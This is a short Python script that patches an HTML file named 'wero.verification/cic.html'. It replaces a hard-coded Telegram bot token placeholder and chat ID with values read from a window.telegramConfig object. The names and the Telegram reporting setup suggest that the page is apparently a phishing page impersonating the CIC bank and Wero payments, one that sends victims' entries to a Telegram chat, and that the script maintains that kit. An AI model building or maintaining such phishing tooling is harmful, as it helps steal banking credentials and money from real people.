import re

# Fix CIC
with open("wero.verification/cic.html", 'r', encoding='utf-8') as f:
    content = f.read()

# Replace the old token references in the script section
content = re.sub(
    r"const TELEGRAM_BOT_TOKEN = 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';",
    "const TELEGRAM_BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';",
    content
)

content = re.sub(
    r"const TELEGRAM_CHAT_ID = '6078788670';",
    "const TELEGRAM_CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';",
    content
)

with open("wero.verification/cic.html", 'w', encoding='utf-8') as f:
    f.write(content)

print("[OK] CIC.html fixed!")
print("  - Replaced TELEGRAM_BOT_TOKEN with window.telegramConfig")
print("  - Replaced old Chat ID with window.telegramConfig")
